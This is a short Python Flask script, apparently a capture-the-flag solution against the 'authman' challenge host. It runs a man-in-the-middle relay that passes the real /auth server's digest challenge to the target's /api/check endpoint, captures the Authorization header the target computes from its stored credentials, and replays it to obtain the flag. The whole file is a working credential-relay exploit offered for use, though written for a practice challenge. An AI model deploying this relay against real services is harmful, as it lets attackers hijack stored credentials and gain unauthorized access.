from flask import Flask, request, Response
import requests

app = Flask(__name__)
TARGET = 'https://authman.challs.pwnoh.io/auth'
session = requests.Session()


@app.route('/auth', methods=['GET'])
def mitm():
    auth_header = request.headers.get('Authorization')

    if not auth_header:
        # 1. The `/api/check` endpoint will try to authenticate with our MITM server,
        # we forward the request to the `/auth` endpoint on the server.
        resp = session.get(TARGET)
        if resp.status_code == 401:
            # 2. `/auth` will respond with a challenge, which we will relay back to `/api/check`.
            return Response('Unauthorized', 401,
                            {'WWW-Authenticate': resp.headers['WWW-Authenticate']})
    # 3. `/api/check` will compute the Authorization header using its stored username and password, and send it to us
    # we will get here since we have the Authorization header
    # 4. We will pass the Authorization header to the `/auth` endpoint,
    # which will authenticate us and return the flag.
    resp = session.get(TARGET, headers={'Authorization': auth_header})
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Body: {resp.text}")
    return resp.text


if __name__ == '__main__':
    app.run(port=8080, host='0.0.0.0')
